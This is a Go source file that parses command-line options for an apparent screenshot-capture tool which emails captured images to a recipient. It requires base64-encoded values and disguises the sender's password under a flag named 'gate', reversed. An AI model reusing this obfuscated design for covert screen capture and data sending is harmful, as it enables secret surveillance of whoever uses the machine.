package pkg

import (
	"encoding/base64"
	"flag"
	"log"
	"os"
	"strconv"
	"strings"
)

type ParsedFlag struct {
	ScreenShotInterval uint16
	SyncInterval       uint16
	FromEmail          string
	Password           string
	ToEmail            string
	KeyPath            string
	ShotsFolder        string
}

type flagInfo struct {
	name         string
	defaultValue string
	usage        string
	userSupplied *string
	validation   func(info *flagInfo)
	provide      func(info *flagInfo)
}

func ParseFlags() ParsedFlag {
	var screenShotInterval uint16 = 0
	var syncInterval uint16
	var fromEmail string
	var password string
	var toEmail string
	var keyPath string
	var shotsFolder string
	flagInfos := []*flagInfo{
		{
			name:         "cap_interval",
			usage:        "Capture interval in seconds. Must be greater than 10. Ex. 22",
			userSupplied: nil,
			validation:   checkUnsigned16,
			provide:      asUin16(&screenShotInterval),
		},
		{
			name:         "sync_interval",
			usage:        "Sync interval in seconds. Must be greater than 10. Recommended at least 300",
			userSupplied: nil,
			validation:   checkUnsigned16,
			provide:      asUin16(&syncInterval),
		},
		{
			name:         "from_email",
			usage:        "Sender email address",
			userSupplied: nil,
			validation:   emptyCheck,
			provide:      asBase64Decode(&fromEmail),
		},
		{
			name:         "to_email",
			usage:        "Receiver email address",
			userSupplied: nil,
			validation:   emptyCheck,
			provide:      asBase64Decode(&toEmail),
		},
		{
			name:         "gate",
			usage:        "Sender's password",
			userSupplied: nil,
			validation:   emptyCheck,
			provide:      asPassword(&password),
		},
		{
			name:         "keyPath",
			usage:        "Recipient's public key path",
			userSupplied: nil,
			validation:   checkPathExists,
			provide:      asBase64Decode(&keyPath),
		},
		{
			name:         "shots",
			usage:        "Shots folder path",
			userSupplied: nil,
			validation:   checkPathExists,
			provide:      asBase64Decode(&shotsFolder),
		},
	}
	for _, flagInfo := range flagInfos {
		flagInfo.userSupplied = flag.String(flagInfo.name, flagInfo.defaultValue, flagInfo.usage)
	}
	flag.Parse()
	validateAndProvide(flagInfos)

	return ParsedFlag{
		ScreenShotInterval: screenShotInterval,
		SyncInterval:       syncInterval,
		FromEmail:          fromEmail,
		Password:           password,
		ToEmail:            toEmail,
		KeyPath:            keyPath,
		ShotsFolder:        shotsFolder,
	}
}

func validateAndProvide(flags []*flagInfo) {
	for _, flagInfo := range flags {
		flagInfo.validation(flagInfo)
		flagInfo.provide(flagInfo)
	}
}
func emptyCheck(input *flagInfo) {
	if len(strings.TrimSpace(*input.userSupplied)) == 0 {
		log.Fatalf("invalid '%s' '%s'. Must not be empty", input.name, *input.userSupplied)
	}
}

func checkUnsigned16(input *flagInfo) {
	interval, err := strconv.Atoi(*input.userSupplied)
	if err != nil || interval <= 10 || interval > 65535 {
		log.Fatalf("invalid '%s' '%s'. Allowed range (10, 65535]", input.name, *input.userSupplied)
	}
}

func checkPathExists(input *flagInfo) {
	decoded := decode(input)
	if _, err := os.Stat(decoded); os.IsNotExist(err) {
		log.Fatalf("invalid '%s' '%s'. Path does not exist.", input.name, decoded)
	}
}

func asUin16(target *uint16) func(*flagInfo) {
	return func(input *flagInfo) {
		interval, _ := strconv.Atoi(*input.userSupplied)
		*target = uint16(interval)
	}
}

func asBase64Decode(target *string) func(*flagInfo) {
	return func(input *flagInfo) {
		*target = decode(input)
	}
}

func asPassword(target *string) func(info *flagInfo) {
	return func(input *flagInfo) {
		str := decode(input)
		output := reverse(str)
		*target = output
	}
}

func decode(input *flagInfo) string {
	decoded, err := base64.StdEncoding.DecodeString(*input.userSupplied)
	if err != nil {
		log.Fatalf("failed to decode '%s'", input.name)
	}
	return string(decoded)
}

func reverse(str string) string {
	// Get Unicode code points.
	n := 0
	runes := make([]rune, len(str))
	for _, r := range str {
		runes[n] = r
		n++
	}
	runes = runes[0:n]
	// Reverse
	for i := 0; i < n/2; i++ {
		runes[i], runes[n-1-i] = runes[n-1-i], runes[i]
	}
	// Convert back to UTF-8.
	output := string(runes)
	return output
}
